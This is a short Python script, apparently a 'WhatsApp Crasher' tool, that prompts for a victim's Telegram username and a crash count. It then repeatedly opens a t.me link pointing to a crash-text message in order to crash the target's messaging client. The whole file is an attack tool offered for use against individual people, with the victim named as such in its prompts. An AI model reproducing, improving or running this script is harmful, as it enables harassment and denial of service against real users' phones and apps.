import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y  = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")

logo = f"""
{R}╔╗╔╗╔╦╗─╔╦═══╦════╦═══╦═══╦═══╦═══╗
║║║║║║║─║║╔═╗║╔╗╔╗║╔═╗║╔═╗║╔═╗║╔═╗║
║║║║║║╚═╝║║─║╠╝║║╚╣╚══╣║─║║╚═╝║╚═╝║
║╚╝╚╝║╔═╗║╚═╝║─║║─╚══╗║╚═╝║╔══╣╔══╝
╚╗╔╗╔╣║─║║╔═╗║─║║─║╚═╝║╔═╗║║──║║
─╚╝╚╝╚╝─╚╩╝─╚╝─╚╝─╚═══╩╝─╚╩╝──╚╝
{G}█▀▀ █▀█ ▄▀█ █▀ █░█ █▀▀ █▀█ {C}Coded By Wixxo Tech
{G}█▄▄ █▀▄ █▀█ ▄█ █▀█ ██▄ █▀▄ {C}Crash Txt by @WixxoTech
"""
os.system('clear')
def main():
	os.system('clear')
	print(logo)
	print(G)
	number=input(f"{G}[+] Enter the Victim's Telegram username not use \n\n{G}=> ")
	print()
	crash=int(input(f'[+] Enter the number of crashes {W}(Max 50per 10Min) \n\n=> '))
	link = (f"""xdg-open https://t.me/{number}/?text=https://t.me/BaapGCrasher/8""")
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now")
		link1 = os.system(link)
		time.sleep(5)
		if link1 == 0:
			print(f"{G} Successful")
			pass
		else:
			print(f"{G}[×] Failed  ")
		time.sleep(0.2)
	return main()
main()
	
